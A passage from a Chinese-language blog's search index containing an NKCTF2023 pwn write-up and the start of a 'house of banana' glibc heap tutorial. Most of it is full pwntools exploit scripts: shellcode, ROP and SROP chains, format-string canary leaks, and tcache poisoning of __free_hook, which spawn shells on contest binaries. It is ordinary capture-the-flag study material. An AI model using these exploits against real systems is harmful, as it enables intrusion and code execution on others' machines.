'.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"stack","slug":"stack","permalink":"http://example.com/categories/stack/"}],"tags":[]},{"title":"NKCTF2023","slug":"NKCTF","date":"2023-03-26T13:45:55.000Z","updated":"2023-09-14T17:20:12.000Z","comments":true,"path":"2023/03/26/NKCTF/","link":"","permalink":"http://example.com/2023/03/26/NKCTF/","excerpt":"","text":"打的比较坐牢 主要还是有的题目没有给libc文件 题目质量还是挺不错的 扩展了思路 ezshellcode这题老熟人了哈哈 还记得刚开始学pwn的时候 写的第一篇wp就是猜数字 顺便这题真的被坑了一手 一开始没仔细看题目 看到随机数就以为时间当种子 爆破半天发现是固定种子 默认1 签到题 不解释了 from pwn import*from ctypes import *from LibcSearcher import*io = process(&quot;./pwn&quot;)#io = remote(&quot;node.yuzhian.com.cn&quot;,32980)context.log_level = &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]#libc = ELF(&quot;./刷题/libc-2.32.so&quot;)#libc = ELF(&quot;/home/chen/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so&quot;)libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)# context.arch = &quot;i386&quot;context.arch = &quot;amd64&quot;elf = ELF(&quot;./nk&quot;)def debug(): gdb.attach(io) pause()io.recvuntil(&quot;u can make it in 5 min!&quot;)libc.srand(1)buf = libc.rand() % 100 + 1payload = cyclic(buf)+asm(shellcraft.sh())io.send(payload)io.recvuntil(&quot;good luck!&quot;)io.interactive() a_story_of_a_pwner int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4; // [rsp+4h] [rbp-Ch] BYREF int v5; // [rsp+8h] [rbp-8h] BYREF int v6; // [rsp+Ch] [rbp-4h] BYREF init(argc, argv, envp); puts(&quot;today, I want to tell you some stories about myself.&quot;); puts(&quot;I have a lot of stories, which one do you want to hear?&quot;); while ( 1 ) &#123; while ( 1 ) &#123; while ( 1 ) &#123; while ( 1 ) &#123; menu(); if ( opt != 1 ) break; acm(&amp;v6); v6 = 1; &#125; if ( opt != 2 ) break; ctf(&amp;v5); v5 = 1; &#125; if ( opt != 3 ) break; love(&amp;v4); v4 = 1; &#125; if ( opt != 4 ) break; if ( v6 &amp;&amp; v5 &amp;&amp; v4 ) heart(); else warning(&amp;v6, &amp;v5, &amp;v4); &#125; puts(&quot;wrong choice.&quot;); puts(&quot;you hurt me so much.&quot;); puts(&quot;DO YOU THINK IT&#x27;S FUNNY TO CHOOSE INCORRECT OPTION?&quot;); puts(&quot;BYE.&quot;); return 0;&#125; 一开始还以为是堆 跟进一下每个函数发现还是比较简单的 acm ctf love三个函数每个函数进去可以往bss段上写0x8字节的数据 并且这三个位置是相邻的 同时在函数执行完以后 会各自把一个值设置为1 接着要进入heart函数的分支有两种情况 一种是值都为1 也就是已经执行完3个函数了 还有一种就是没有全部执行完 跟进一下heart函数和warning函数 ssize_t heart()&#123; char buf[10]; // [rsp+6h] [rbp-Ah] BYREF puts(&quot;now, come and read my heart...&quot;); return read(0, buf, 0x20uLL);&#125; 可以溢出0x16字节 也就够个栈迁移了 联想到之前可以往bss段写数据 那就是往那边迁移了 int warning()&#123; puts(&quot;Before u read this, i think u should read first 3.&quot;); return printf(&quot;I give it up, you can see this. %p\\n&quot;, &amp;puts);&#125; 直接送了puts函数的真实地址 那就好办了 接收一下 然后在bss段上构造system(“&#x2F;bin&#x2F;sh”) 随后迁移过去 from pwn import*from ctypes import *from LibcSearcher import*io = process(&quot;./pwn&quot;)#io = remote(&quot;node.yuzhian.com.cn&quot;,37719)context.log_level = &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]#libc = ELF(&quot;./刷题/libc-2.32.so&quot;)libc = ELF(&quot;/home/chen/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so&quot;)#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/lib# context.arch = &quot;i386&quot;context.arch = &quot;amd64&quot;elf = ELF(&quot;./nk&quot;)def debug(): gdb.attach(io) pause()io.recvuntil(&quot;&gt; &quot;)io.sendline(b&#x27;4&#x27;)io.recvuntil(&quot;I give it up, you can see this. &quot;)puts_addr = int(io.recv(14),16)success(&quot;puts_addr :&quot;+hex(puts_addr))libc_addr = puts_addr - libc.sym[&#x27;puts&#x27;]success(&quot;libc_addr :&quot;+hex(libc_addr))rdi_addr = 0x0000000000401573binsh_addr = libc_addr + next(libc.search(b&quot;/bin/sh&quot;))system_addr = libc_addr + libc.sym[&#x27;system&#x27;]leave_addr = 0x000000000040139e io.recvuntil(&quot;&gt; &quot;)io.sendline(b&#x27;2&#x27;)io.send(p64(rdi_addr))io.recvuntil(&quot;&gt; &quot;)io.sendline(b&#x27;1&#x27;)io.send(p64(binsh_addr))io.recvuntil(&quot;&gt; &quot;)io.sendline(b&#x27;3&#x27;)io.send(p64(system_addr))io.recvuntil(&quot;&gt; &quot;)io.sendline(b&#x27;4&#x27;)io.recv()io.recv()onegadget_addr = libc_addr +0xe3b04payload = cyclic(10)+p64(0x4050A0-8)+p64(leave_addr)io.sendline(payload)io.interactive() ez_stack __int64 vuln()&#123; signed __int64 v0; // rax signed __int64 v1; // rax char buf[16]; // [rsp+0h] [rbp-10h] BYREF v0 = sys_write(1u, nkctf, 0x26uLL); v1 = sys_read(0, buf, 0x200uLL); return 0LL;&#125; 隐约记得哪一年的国赛也有这种类型的题目 记得是srop来着 翻了翻之前的博客 发现还真是(所以写写博客还是有用的对吧) ROPgadget看看能不能控制rax的值 果然发现了 那这一题就是srop了 不过还需要找个地方写binsh字符串 所以先srop写一个read到bss段上 然后再getshell from pwn import*from ctypes import *from LibcSearcher import*io = process(&quot;./pwn&quot;)#io = remote(&quot;node.yuzhian.com.cn&quot;,32980)context.log_level = &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]#libc = ELF(&quot;./刷题/libc-2.32.so&quot;)libc = ELF(&quot;/home/chen/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so&quot;)#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/lib# context.arch = &quot;i386&quot;context.arch = &quot;amd64&quot;elf = ELF(&quot;./nk&quot;)def debug(): gdb.attach(io) pause()io.recv()bss_addr= 0x404080+0x100main_addr = elf.sym[&#x27;main&#x27;]rax_15 = 0x0000000000401146syscall_addr = 0x000000000040114eframe = SigreturnFrame()frame.rax = 0frame.rdi = 0frame.rsi = bss_addrframe.rdx = 0x200frame.rip = syscall_addrframe.rsp = bss_addrpayload = cyclic(0x18)+p64(rax_15)+p64(syscall_addr)+bytes(frame)io.sendline(payload)binsh_addr = bss_addr +264frame = SigreturnFrame()frame.rax = 59frame.rdi = binsh_addrframe.rsi = 0frame.rdx = 0frame.rip = syscall_addrpayload = p64(rax_15)+p64(syscall_addr)+bytes(frame)+b&#x27;/bin/sh\\x00&#x27;# gdb.attach(io,&#x27;b *&#x27;+str(rax_15))# pause(0)io.sendline(payload)io.interactive() baby_rop __int64 vuln()&#123; const char *format; // [rsp+8h] [rbp-118h] char src[8]; // [rsp+10h] [rbp-110h] BYREF char dest[8]; // [rsp+18h] [rbp-108h] BYREF char v4[248]; // [rsp+20h] [rbp-100h] BYREF unsigned __int64 v5; // [rsp+118h] [rbp-8h] v5 = __readfsqword(0x28u); strcpy(dest, &quot;Hello, &quot;); puts(&quot;Welcome to the NKCTF message board!&quot;); printf(&quot;What is your name: &quot;); my_read(src, 8LL); format = strcat(dest, src); printf(format); puts(&quot;What are your comments and suggestions for the NKCTF: &quot;); my_read(v4, 256LL); puts(&quot;Thank you, we will read your comments and suggestions carefully.&quot;); return 0LL;&#125; 格式化字符串 顺便还可以往栈上写数据 不过并不能栈溢出 一开始确实没什么思路 不过后来发现main函数结束前的指令有点不一样 .text:000000000040138C endbr64.text:0000000000401390 push rbp.text:0000000000401391 mov rbp, rsp.text:0000000000401394 mov eax, 0.text:0000000000401399 call init.text:000000000040139E mov eax, 0.text:00000000004013A3 call vuln.text:00000000004013A8 leave.text:00000000004013A9 mov eax, 0.text:00000000004013AE pop rbp.text:00000000004013AF retn 最后rsp指向的是环境变量那一块 然后我就想能不能破坏一下栈结构 看能不能利用写栈上0x100的字节构造一个rop链 然后就想到canary了嘛 调用___stack_chk_fail的话总归会对栈结构产生影响 再加上有格式化字符串漏洞 泄露canary还是小菜一碟的 io.recvuntil(&quot;What is your name: &quot;)# gdb.attach(io,&#x27;b *0x401340&#x27;)io.sendline(b&#x27;%41$p%p&#x27;)io.recv(7)canary = int(io.recv(18),16)success(&quot;canary :&quot;+hex(canary))stack_addr = int(io.recv(14),16)success(&quot;stack_addr :&quot;+hex(stack_addr)) 计算一下偏移泄露canary 顺便不要浪费机会 顺便泄露一下栈地址 到时候还要用到binsh字符串呢 payload = p64(ret_addr)*30+p64(main_addr)+p64(canary)gdb.attach(io,&#x27;b *0x40138B&#x27;)pause(0)io.send(payload)pause() 然后试着覆盖一下canary 你就会发现最后的rsp会乱偏 为了提高打通的效率 我们就多塞几个ret 这样确保可以返回到main函数 然后回到main函数以后 再次利用格式化字符串泄露libc基址 然后同样的办法构造system链就行了 顺便吐槽一下不给libc的行为 2.31 9.9的用libcsearch也查不到 一血就这样没了 就拿了个三血 from pwn import*from ctypes import *from LibcSearcher import*io = process(&quot;./pwn&quot;)#io = remote(&quot;node.yuzhian.com.cn&quot;,34395)context.log_level = &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]libc = ELF(&quot;/home/chen/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so&quot;)#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)#libc = ELF(&quot;./刷题/libc-2.32.so&quot;)# context.arch = &quot;i386&quot;context.arch = &quot;amd64&quot;elf = ELF(&quot;./pwn&quot;)def debug(): gdb.attach(io) pause()io.recvuntil(&quot;What is your name: &quot;)# gdb.attach(io,&#x27;b *0x401340&#x27;)io.sendline(b&#x27;%41$p%p&#x27;)io.recv(7)canary = int(io.recv(18),16)success(&quot;canary :&quot;+hex(canary))stack_addr = int(io.recv(14),16)success(&quot;stack_addr :&quot;+hex(stack_addr))io.recvuntil(&quot;What are your comments and suggestions for the NKCTF: &quot;)main_addr = elf.sym[&#x27;main&#x27;]start_addr = elf.sym[&#x27;_start&#x27;]ret_addr = 0x000000000040101arsp_addr = 0x000000000040140dpayload = p64(ret_addr)*30+p64(main_addr)+p64(canary)io.send(payload)io.recvuntil(&quot;What is your name: &quot;)io.sendline(b&#x27;%25$p&#x27;)addr = int(io.recvuntil(&quot;What&quot;,drop = True)[-14:],16) success(&quot;addr :&quot;+hex(addr))#obj = LibcSearcher(&quot;_IO_2_1_stderr_&quot;,addr)libc_addr = addr - libc.sym[&#x27;_IO_2_1_stderr_&#x27;]#obj.dump(&quot;_IO_2_1_stderr_&quot;)success(&quot;libc_addr :&quot;+hex(libc_addr))system_addr = libc_addr + libc.sym[&#x27;system&#x27;]rdi_addr = 0x0000000000401413binsh_addr = libc_addr + next(libc.search(b&quot;/bin/sh&quot;))payload = p64(ret_addr)*28+p64(rdi_addr)+p64(binsh_addr)+p64(system_addr)+p64(canary)io.sendline(payload)io.recv()io.interactive() 9961code int __cdecl main(int argc, const char **argv, const char **envp)&#123; void *buf; // [rsp+0h] [rbp-10h] init(argc, argv, envp); buf = (void *)(int)mmap((void *)0x9961000, 0x1000uLL, 7, 34, -1, 0LL); puts(&quot;Last night i played touhou fuujinroku ~ Mountain of Faith\\n&quot;); puts(&quot;F**k! I failed and 9961 in the end!\\n&quot;); puts(&quot;In that case, you can only enter a very short shellcode!\\n&quot;); read(0, buf, 0x16uLL); puts(&quot;I hope you can NMNB it!&quot;); mprotect(buf, 0x1000uLL, 4); JUMPOUT(0x9961000LL);&#125; 手写shellcode 一开始我是想着先构造mprotect 开一下0x9961000的可写可读权限 然后返回main函数重新构造read链 但是发现不行啊 开了pie不知道要怎么返回去 想了半天 问了其他师傅 学了一手直接打 from pwn import*from ctypes import *from LibcSearcher import*io = process(&quot;./pwn&quot;)#io = remote(&quot;node2.yuzhian.com.cn&quot;,36613)context.log_level = &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]libc = ELF(&quot;./glibc-all-in-one/libs/2.32-0ubuntu3.2_amd64/libc-2.32.so&quot;)#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)#libc = ELF(&quot;./libc-2.32.so&quot;)#libc = ELF(&quot;./locate&quot;)# context.arch = &quot;i386&quot;context.arch = &quot;amd64&quot;elf = ELF(&quot;./pwn&quot;)def debug(): gdb.attach(io) pause()io.recvuntil(&quot;In that case, you can only enter a very short shellcode!&quot;)shellcode = &quot;&quot;&quot; xor rsi,rsi lea rdi,[r15+0xe] cdq mov ax,59 syscall&quot;&quot;&quot;# gdb.attach(io,&#x27;b *$rebase(0x139B)&#x27;)# pause(0)io.send(asm(shellcode)+b&#x27;/bin/sh\\x00&#x27;)io.recvuntil(&quot;I hope you can NMNB it!&quot;)io.interactive() 学到了cdq这个指令 可以把eax第31位赋值给edx所有的bit 在这里也就是起到了清空rdx寄存器的作用 值得一题的就是本地死活打不通 但是远程能通 不知道什么情况 baby_heap 这题堆开局就给我来一记重锤 用xclibc换libc版本的时候 运行提示段内存错误 然后发现是libc没有换上 那就手动换一下吧 patchelf --replace-needed /lib/x86_64-linux-gnu/libc.so.6 /home/chen/glibc-all-in-one/libs/2.32-0ubuntu3_amd64/ ./pwn 程序函数给齐了 add delete edit show add函数最多申请0x100 delete函数置零了指针 不存在UAF edit函数存在一个字节的溢出 show函数可以打印出堆块内容 还真是easy_heap 这题用到的办法是我最开始学堆的时候用的 利用单字节溢出合并两个chunk 释放到unsortedbin中 然后再申请同样size的小chunk出来就存在chunk overlap 只不过中途会有些小问题 add(0,0x18)add(1,0x40)add(2,0x40)for i in range(7): add(3+i,0x90)for i in range(7): delete(3+i)payload = cyclic(0x18)+b&#x27;\\xa1&#x27;edit(0,payload)delete(1)add(10,0x40)edit(2,b&#x27;\\x0a&#x27;)show(2)main_arena_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))-96-0xalibc_addr = main_arena_addr - (libc.sym[&#x27;__malloc_hook&#x27;]+0x10)free_hook = libc_addr + libc.sym[&#x27;__free_hook&#x27;]system_addr = libc_addr + libc.sym[&#x27;system&#x27;]success(&quot;libc_addr :&quot;+hex(libc_addr)) 一个是2.32的main_arena_addr+xxh末尾是\\x00 所以要先覆盖成其他值 还有一点是接下来想再申请0x40的chunk 也就是chunk2 构成一个chunk overlap的时候 报错了 malloc(): unsorted double linked list corrupted 是因为此时unsortedchunk的fd域被破坏了 那简单 复原一下就好了 edit(2,p64(main_arena_addr+96)*2)add(11,0x40)delete(11)show(2)key = u64(io.recvuntil(&quot;\\x0a&quot;,drop = True).ljust(8,b&#x27;\\x00&#x27;))success(&quot;key :&quot;+hex(key))edit(2,p64(free_hook^key)) 这时候就利用chunk overlap来实现tcachebin attack libc版本是2.32 所以还需要注意一下tcache的key机制 但是这时候却申请不出来free_hook的chunk 因为此时plmalloc认为这个链表中已经没有chunk了 前面的数值是0 再次申请不会去对应链表中查找 而是直接分配一个新的 解决办法就是多释放几个进去就行了 from pwn import*from ctypes import *from LibcSearcher import*io = process(&quot;./pwn&quot;)#io = remote(&quot;ctf.comentropy.cn&quot;,8301)context.log_level = &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]libc = ELF(&quot;./glibc-all-in-one/libs/2.32-0ubuntu3.2_amd64/libc-2.32.so&quot;)#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)#libc = ELF(&quot;./libc-2.32.so&quot;)#libc = ELF(&quot;./locate&quot;)# context.arch = &quot;i386&quot;context.arch = &quot;amd64&quot;elf = ELF(&quot;./pwn&quot;)def debug(): gdb.attach(io) pause()def add(index,size): io.recvuntil(&quot;Your choice: &quot;) io.sendline(b&#x27;1&#x27;) io.recvuntil(&quot;Enter the index: &quot;) io.sendline(str(index)) io.recvuntil(&quot;Enter the Size: &quot;) io.sendline(str(size))def delete(index): io.recvuntil(&quot;Your choice: &quot;) io.sendline(b&#x27;2&#x27;) io.recvuntil(&quot;Enter the index: &quot;) io.sendline(str(index))def edit(index,content): io.recvuntil(&quot;Your choice: &quot;) io.sendline(b&#x27;3&#x27;) io.recvuntil(&quot;Enter the index: &quot;) io.sendline(str(index)) io.recvuntil(&quot;Enter the content: &quot;) io.sendline(content)def show(index): io.recvuntil(&quot;Your choice: &quot;) io.sendline(b&#x27;4&#x27;) io.recvuntil(&quot;Enter the index: &quot;) io.sendline(str(index))add(0,0x18)add(1,0x40)add(2,0x40)for i in range(7): add(3+i,0x90)for i in range(7): delete(3+i)payload = cyclic(0x18)+b&#x27;\\xa1&#x27;edit(0,payload)delete(1)add(10,0x40)edit(2,b&#x27;\\x0a&#x27;)show(2)main_arena_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))-96-0xalibc_addr = main_arena_addr - (libc.sym[&#x27;__malloc_hook&#x27;]+0x10)free_hook = libc_addr + libc.sym[&#x27;__free_hook&#x27;]system_addr = libc_addr + libc.sym[&#x27;system&#x27;]success(&quot;libc_addr :&quot;+hex(libc_addr))edit(2,p64(main_arena_addr+96)*2)add(11,0x40)add(12,0x40)add(13,0x40)delete(11)show(2)key = u64(io.recvuntil(&quot;\\x0a&quot;,drop = True).ljust(8,b&#x27;\\x00&#x27;))success(&quot;key :&quot;+hex(key))add(14,0x40)delete(12)delete(13)delete(14)edit(2,p64(free_hook^key))add(15,0x40)add(3,0x40)edit(3,p64(system_addr))edit(15,b&#x27;/bin/sh\\x00&#x27;)delete(15)io.interactive() only_read int __cdecl main(int argc, const char **argv, const char **envp)&#123; char s1[64]; // [rsp+0h] [rbp-80h] BYREF char s[64]; // [rsp+40h] [rbp-40h] BYREF setbuf(stdin, 0LL); setbuf(stdout, 0LL); setbuf(stderr, 0LL); memset(s, 0, sizeof(s)); memset(s1, 0, sizeof(s1)); read(0, s, 0x30uLL); base_decode(s, s1); if ( strcmp(s1, &quot;Welcome to NKCTF!&quot;) ) return 0; memset(s, 0, sizeof(s)); memset(s1, 0, sizeof(s1)); read(0, s, 0x30uLL); base_decode(s, s1); if ( strcmp(s1, &quot;tell you a secret:&quot;) ) return 0; memset(s, 0, sizeof(s)); memset(s1, 0, sizeof(s1)); read(0, s, 0x40uLL); base_decode(s, s1); if ( strcmp(s1, &quot;I&#x27;M RUNNING ON GLIBC 2.31-0ubuntu9.9&quot;) ) return 0; memset(s, 0, sizeof(s)); memset(s1, 0, sizeof(s1)); read(0, s, 0x40uLL); base_decode(s, s1); if ( !strcmp(s1, &quot;can you find me?&quot;) ) next(); return 0;&#125; 这题实在是太坐牢了 我自己尝试的是ogg爆破 本地关了ASLR以后 写对偏移就通了 但是远程是死活爆破不通 最后换了个办法 可惜了 我觉得我ogg爆破的办法是真的奇才 from pwn import*from ctypes import *from LibcSearcher import*#io = process(&quot;./pwn&quot;)#io = remote(&quot;node2.yuzhian.com.cn&quot;,35140)#context.log_level = &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]libc = ELF(&quot;./glibc-all-in-one/libs/2.32-0ubuntu3.2_amd64/libc-2.32.so&quot;)#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)#libc = ELF(&quot;./libc-2.32.so&quot;)#libc = ELF(&quot;./locate&quot;)# context.arch = &quot;i386&quot;context.arch = &quot;amd64&quot;elf = ELF(&quot;./pwn&quot;)def debug(): gdb.attach(io) pause()while True: try: io = remote(&quot;node2.yuzhian.com.cn&quot;,35140) io.sendline(b&#x27;V2VsY29tZSB0byBOS0NURiE=\\x00&#x27;) sleep(0.2) io.sendline(b&#x27;dGVsbCB5b3UgYSBzZWNyZXQ6\\x00&#x27;) sleep(0.2) io.sendline(b&#x27;SSdNIFJVTk5JTkcgT04gR0xJQkMgMi4zMS0wdWJ1bnR1OS45\\x00&#x27;) sleep(0.2) io.sendline(b&#x27;Y2FuIHlvdSBmaW5kIG1lPw==\\x00&#x27;) sleep(0.2) rbp_addr = 0x000000000040117d leave_addr = 0x00000000004013c2 gadget1_addr = 0x401660 gadget2_addr = 0x401676 next_addr = 0x4013c4 payload = cyclic(0x38)+p64(gadget2_addr) payload += cyclic(0x8)+p64(0)+p64(1)+p64(0)+p64(elf.got[&#x27;setbuf&#x27;])+p64(8)+p64(elf.got[&#x27;read&#x27;]) payload += p64(gadget1_addr)+p64(0)*7+p64(next_addr) # gdb.attach(io,&#x27;b *0x4013E8&#x27;) # pause(0) sleep(0.2) io.send(payload) io.send(p16(0x3afe) + p8(0xea)) payload = cyclic(0x38)+p64(rbp_addr)+p64(elf.got[&#x27;setbuf&#x27;]-0x8)+p64(leave_addr) # gdb.attach(io,&#x27;b *&#x27;+str(rbp_addr)) # pause(0) sleep(0.2) io.send(payload) sleep(0.2) io.sendline(b&#x27;cat flag.txt&#x27;) flag = io.recv() assert(len(flag)&gt;0) print(flag) io.interactive() except EOFError: io.close() 就贴在这了吧 纪念一下死去的理想 说回正题 开局的那几个base64还是很好绕过的 要注意的是有的末尾要加了\\x00 不然不知道为啥过不了strcmp 随后就是一个栈溢出 长度管够 但是只有这四个函数 直接覆盖setbuf的got表为puts函数 然后把setbuf当puts使就行了 注意一下爆破脚本 在前面那一堆payload传输的中间要加sleep 不然会出现奇怪的问题 我就是这个问题卡了好久的远程 from pwn import*from ctypes import *from LibcSearcher import*#io = process(&quot;./pwn&quot;)#io = remote(&quot;node2.yuzhian.com.cn&quot;,31530)#context.log_level = &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]libc = ELF(&quot;./glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so&quot;)#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)#libc = ELF(&quot;./libc-2.32.so&quot;)#libc = ELF(&quot;./locate&quot;)# context.arch = &quot;i386&quot;context.arch = &quot;amd64&quot;elf = ELF(&quot;./pwn&quot;)def debug(): gdb.attach(io) pause()while True: try: io = process(&quot;./pwn&quot;) #io = remote(&quot;node2.yuzhian.com.cn&quot;,35140) io.sendline(b&#x27;V2VsY29tZSB0byBOS0NURiE=\\x00&#x27;) sleep(0.5) io.sendline(b&#x27;dGVsbCB5b3UgYSBzZWNyZXQ6\\x00&#x27;) sleep(0.5) io.sendline(b&#x27;SSdNIFJVTk5JTkcgT04gR0xJQkMgMi4zMS0wdWJ1bnR1OS45\\x00&#x27;) sleep(0.5) io.sendline(b&#x27;Y2FuIHlvdSBmaW5kIG1lPw==\\x00&#x27;) sleep(0.5) rbp_addr = 0x000000000040117d leave_addr = 0x00000000004013c2 gadget1_addr = 0x401660 gadget2_addr = 0x401676 read_addr = 0x401090 rsi_r15 = 0x0000000000401681 rdi_addr = 0x0000000000401683 main_addr = 0x4013E9 ret_addr = 0x000000000040101a next_addr = 0x4013c4 payload = cyclic(0x38)+p64(rdi_addr)+p64(0)+p64(rsi_r15)+p64(elf.got[&#x27;setbuf&#x27;])*2+p64(elf.sym[&#x27;read&#x27;])+p64(rdi_addr)+p64(elf.got[&#x27;read&#x27;])+p64(elf.sym[&#x27;setbuf&#x27;])+p64(next_addr) # gdb.attach(io,&#x27;b *&#x27;+str(rdi_addr)) # pause(0) io.send(payload) sleep(0.5) # pause() # gdb.attach(io,&#x27;b *0x4013C4&#x27;) # pause(0) io.send(p16(0x4420)) read_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;)) libc_addr = read_addr - libc.sym[&#x27;read&#x27;] success(&quot;libc_addr :&quot;+hex(libc_addr)) system_addr = libc_addr + libc.sym[&#x27;system&#x27;] binsh_addr = libc_addr + libc.search(b&quot;/bin/sh&quot;).__next__() payload = cyclic(0x38)+p64(ret_addr)+p64(rdi_addr)+p64(binsh_addr)+p64(system_addr) io.send(payload) io.sendline(b&#x27;cat flag.txt&#x27;) flag = io.recv() assert(len(flag)&gt;0) print(flag) io.interactive() except EOFError: io.close() if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"wp","slug":"wp","permalink":"http://example.com/categories/wp/"}],"tags":[]},{"title":"house of banana","slug":"house-of-banana","date":"2023-03-24T05:59:01.000Z","updated":"2023-09-14T17:19:22.000Z","comments":true,"path":"2023/03/24/house-of-banana/","link":"","permalink":"http://example.com/2023/03/24/house-of-banana/","excerpt":"","text":"前言功能十分强大的一个house of 系列 可以执行onegadget或者是system(“&#x2F;bin&#x2F;sh”)来获取shell原理是通过largebinattack把chunk_addr覆盖程序执行exit时所需要的结构体 进行伪造 这样就可以劫持exit函数 源码分析我们在之前的栈部分学习中 学过篡改fini_array 来进行一个重复执行main函数 但是其利用需要关闭RELRO保护 然而堆题基本都是保护全开 所以很少用到 今天来学习一下伪造fini_array赋值用到的结构体 从而控制程序exit时的程序执行流 利用源码调试 可以知道 fini_array是在&#x2F;elf&#x2F;dl-fini.c的139行被调用的 那么我们跟进一下源码 看一下赋值逻辑 if (l-&gt;l_info[DT_FINI_ARRAY] != NULL)&#123; ElfW(Addr) *array = (ElfW(Addr) *) (l-&gt;l_addr + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr); unsigned int i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val / sizeof (ElfW(Addr))); while (i-- &gt; 0) ((fini_t) array[i]) ();&#125;` array &#x3D; (l-&gt;l_addr + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr) 貌似和l这个链表有关 朔源一下l的定义 struct link_map *l &#x3D; maps[i] 继续朔源一下maps数组的赋值 define GL(name) _rtld_global._##namefor (l = GL(dl_ns)[ns]._ns_loaded, i = 0; l != NULL; l = l-&gt;l_next)/* Do not handle ld.so in secondary namespaces. */if (l == l-&gt;l_real) &#123;assert (i &lt; nloaded);maps[i] = l;l-&gt;l_idx = i;++i;/* Bump l_direct_opencount of all objects so that they are not dlclose()ed from underneath us. */++l-&gt;l_direct_opencount; &#125; maps的赋值和GL(dl_ns)[ns]._ns_loaded这个结构体有关系 所以我们只需要伪造该结构体 就能操控maps的值 从而操控 fini_array的内容 每一次for循环后l的赋值可以看出来其是一个链表 看其他师傅的介绍是必须有四个元素 也就有两种做法 截取第一个节点开始伪造 或者是从第三个节点开始伪造 前者伪造的更加麻烦 这里先来介绍后者的 劫持第三个节点首先需要获得第三个节点的位置 采用计算和_rtld_global结构体的偏移来得到 distance &amp;_rtld_global &amp;(_rtld_global._dl_ns._ns_loaded-&gt;l_next-&gt;l_next-&gt;l_next) 接着为了进入if分支 我们还需要通过第一个判断 l == l-&gt;l_real 也就是在fake+0x28处需要写入fake地址 struct link_map *l = maps[i]; if (l-&gt;l_init_called) &#123; /* Make sure nothing happens if we are called twice. */ l-&gt;l_init_called = 0; /* Is there a destructor function? */ if (l-&gt;l_info[DT_FINI_ARRAY] != NULL || (ELF_INITFINI &amp;&amp; l-&gt;l_info[DT_FINI] != NULL)) &#123; /* When debugging print a message first. */ if (__builtin_expect (GLRO(dl_debug_mask) &amp; DL_DEBUG_IMPCALLS, 0)) _dl_debug_printf (&quot;\\ncalling fini: %s [%lu]\\n\\n&quot;, DSO_FILENAME (l-&gt;l_name), ns); for循环中还有这样一段 为了使for循环顺利执行 我们同样需要绕过这里的if判断 需要绕过l-&gt;l_init_called 不过这里貌似不能是个1就行 需要伪造成其原本的值 和上面的一样 查一下偏移和所需要的值 distance _rtld_global._dl_ns[0]._ns_loaded &amp;(_rtld_global._dl_ns[0]._ns_loaded)-&gt;l_init_calledx/wx &amp;(_rtld_global._dl_ns[0]._ns_loaded)-&gt;l_init_called 第二个if用的是或 通过一个就行了 这里选第一个 可以一并绕过下一个if l-&gt;l_info[DT_FINI_ARRAY] !&#x3D; NULL 同时注意一下下面maps赋值的操作 ElfW(Addr) *array = (ElfW(Addr) *) (l-&gt;l_addr + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr); fini_array的值由l-&gt;l_info[DT_FINI_ARRAY]决定 我们还需要控制i的值 i由下面这个式子得到 i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val / sizeof (ElfW(Addr))) distance (_rtld_global._dl_ns[0]._ns_loaded) &amp;((_rtld_global._dl_ns[0]._ns_loaded)-&gt;l_info[28]) 这里的i跟随着系统原本的布局 并且你会发现 i的值应该是存放在对应偏移地址的下一个字长处 同理可得 我们还需要关注一下l-&gt;l_info[DT_FINI_ARRAY]需要怎么构造 同样是需要把地址放在下一个字长处 并且需要经过两次跳转 总结一下就是按照下面这样构造 这里的偏移因人而异 我把所有的偏移都减去了0x10 是因为fake是从chunk头开始算的 而edit是从chunk的用户空间开始 payload = p64(0)*3 + p64(fake_addr)payload = payload.ljust(0x38,b&#x27;\\x00&#x27;)+p64(fake_addr+0x58)+p64(8)+p64(onegadget_addr)payload = 